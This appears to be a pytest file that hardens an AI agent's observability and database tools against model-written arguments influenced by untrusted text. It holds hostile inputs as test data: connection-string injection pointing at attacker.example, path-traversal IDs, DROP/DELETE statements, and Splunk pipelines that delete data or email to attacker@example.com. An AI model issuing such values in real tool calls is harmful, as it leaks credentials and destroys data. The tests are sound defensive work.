"""A tool argument names a target; it never moves the stored credentials somewhere else.

Arguments are written by the model, which reads untrusted text (log lines,
alert bodies, issue text). Each case here is an argument that used to reach a
different host, endpoint, or kind of statement than the tool is for.
"""

from __future__ import annotations

import ssl
import sys
from types import SimpleNamespace
from typing import Any

import httpx
import pytest

from config.constants.tool_params import config_only_params
from integrations import azure_sql
from integrations.kafka import KafkaConfig, get_topic_health
from integrations.mongodb_atlas import MongoDBAtlasConfig
from integrations.openobserve.tools.openobserve_logs_tool import query_openobserve_logs
from integrations.smtp import delivery as smtp_delivery
from integrations.snowflake.tools.snowflake_query_history_tool import query_snowflake_history
from integrations.splunk.client import SplunkClient
from integrations.splunk.client import SplunkIntegrationConfig as SplunkConfig


def test_an_azure_sql_database_name_cannot_add_connection_attributes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A ``;`` in the name used to start a second server and switch TLS off."""
    connected: list[str] = []
    fake_pyodbc = SimpleNamespace(connect=lambda text, **_kw: connected.append(text))
    monkeypatch.setitem(sys.modules, "pyodbc", fake_pyodbc)
    config = azure_sql.build_azure_sql_config(
        {
            "server": "prod.database.windows.net",
            "database": "master;Address=attacker.example,1433;Encrypt=no",
            "username": "sre_ro",
            "password": "p",
        }
    )

    azure_sql._get_connection(config)

    (connection_string,) = connected
    assert "DATABASE={master;Address=attacker.example,1433;Encrypt=no};" in connection_string
    assert connection_string.count("Encrypt=") == 2  # the quoted text and the real setting


def test_an_azure_sql_server_must_be_a_host_name(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setitem(sys.modules, "pyodbc", SimpleNamespace(connect=lambda *_a, **_kw: None))
    config = azure_sql.build_azure_sql_config(
        {"server": "prod;Address=attacker.example", "database": "master"}
    )

    with pytest.raises(ValueError, match="host name"):
        azure_sql._get_connection(config)


@pytest.mark.parametrize("org", ["default/app_logs/_multi?x=", "../../p?", "a b"])
def test_an_openobserve_organization_is_one_path_segment(
    monkeypatch: pytest.MonkeyPatch, org: str
) -> None:
    def _no_request(*_args: Any, **_kwargs: Any) -> httpx.Response:
        raise AssertionError("no request may be sent for a path-shaped organization")

    monkeypatch.setattr(httpx, "post", _no_request)

    result = query_openobserve_logs(
        base_url="https://o2.example.com", org=org, stream="app", api_token="t"
    )

    assert result["available"] is False


def test_an_atlas_project_id_is_one_path_segment() -> None:
    with pytest.raises(ValueError, match="project_id"):
        MongoDBAtlasConfig(
            api_public_key="k", api_private_key="s", project_id="../orgs/x/apiKeys?x="
        )


def test_kafka_topic_health_never_names_a_topic_to_the_broker(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Asking for one topic's metadata creates it on a broker with auto-creation on."""
    requests: list[dict[str, Any]] = []

    class _Admin:
        def list_topics(self, **kwargs: Any) -> Any:
            requests.append(kwargs)
            partition = SimpleNamespace(leader=1, replicas=[1], isrs=[1])
            topic = SimpleNamespace(partitions={0: partition})
            return SimpleNamespace(topics={"orders": topic, "payments": topic}, brokers={1: None})

    monkeypatch.setattr("integrations.kafka._get_admin_client", lambda _config: _Admin())

    result = get_topic_health(KafkaConfig(bootstrap_servers="broker:9092"), topic="orders")

    assert all("topic" not in request for request in requests)
    assert [topic["name"] for topic in result["topics"]] == ["orders"]


@pytest.mark.parametrize(
    "statement",
    [
        "DROP TABLE ANALYTICS.PUBLIC.ORDERS /* limit */",
        "select 1; delete from t",
        "call admin.grant_all()",
    ],
)
def test_snowflake_runs_one_read_only_statement(
    monkeypatch: pytest.MonkeyPatch, statement: str
) -> None:
    def _no_request(*_args: Any, **_kwargs: Any) -> httpx.Response:
        raise AssertionError("a statement that writes must not reach Snowflake")

    monkeypatch.setattr(httpx, "post", _no_request)

    result = query_snowflake_history(account_identifier="acct", token="t", query=statement)

    assert result["available"] is False


def test_snowflake_still_runs_a_select(monkeypatch: pytest.MonkeyPatch) -> None:
    sent: list[dict[str, Any]] = []

    def _post(_url: str, **kwargs: Any) -> httpx.Response:
        sent.append(kwargs["json"])
        return httpx.Response(200, json={"data": []}, request=httpx.Request("POST", _url))

    monkeypatch.setattr(httpx, "post", _post)

    result = query_snowflake_history(
        account_identifier="acct", token="t", query="select 1 -- limit", limit=5
    )

    assert result["available"] is True
    assert sent[0]["statement"] == "select 1 -- limit\nLIMIT 5"


@pytest.mark.parametrize(
    "search",
    [
        "index=main | delete",
        "index=main [ search x | outputlookup planted.csv ]",
        "index=main | sendemail to=attacker@example.com",
        "| rest /services/authentication/users",
    ],
)
def test_splunk_runs_searches_only(monkeypatch: pytest.MonkeyPatch, search: str) -> None:
    def _no_request(*_args: Any, **_kwargs: Any) -> httpx.Response:
        raise AssertionError("a pipeline that writes must not reach Splunk")

    monkeypatch.setattr(httpx, "post", _no_request)
    client = SplunkClient(SplunkConfig(base_url="https://splunk:8089", token="tok"))

    assert client.search_logs(search)["success"] is False


@pytest.mark.parametrize(
    "tool_name",
    ["list_gitlab_commits", "get_gitlab_file", "list_gitlab_mrs", "list_gitlab_pipelines"],
)
def test_the_model_cannot_choose_where_the_gitlab_token_is_sent(tool_name: str) -> None:
    assert {"gitlab_url", "gitlab_token"} <= config_only_params(tool_name)


@pytest.mark.parametrize("name", ["ca_bundle", "sasl_mechanism", "secure"])
def test_the_model_cannot_weaken_how_a_connection_is_secured(name: str) -> None:
    assert name in config_only_params("any_tool")


@pytest.mark.parametrize("security", ["ssl", "starttls"])
def test_smtp_verifies_the_server_before_sending_the_password(
    monkeypatch: pytest.MonkeyPatch, security: str
) -> None:
    """The library's own default context checks no certificate at all."""
    contexts: list[ssl.SSLContext] = []

    class _Client:
        def __init__(self, *_args: Any, **kwargs: Any) -> None:
            if "context" in kwargs:
                contexts.append(kwargs["context"])

        def ehlo(self) -> None:
            return None

        def starttls(self, *, context: ssl.SSLContext) -> None:
            contexts.append(context)

        def login(self, *_args: Any) -> None:
            assert contexts, "the password was sent before any certificate check was set up"

    monkeypatch.setattr(smtp_delivery.smtplib, "SMTP", _Client)
    monkeypatch.setattr(smtp_delivery.smtplib, "SMTP_SSL", _Client)

    smtp_delivery._connect_client(
        {"host": "smtp.example.com", "security": security, "username": "u", "password": "p"}
    )

    (context,) = contexts
    assert context.verify_mode is ssl.CERT_REQUIRED
    assert context.check_hostname is True
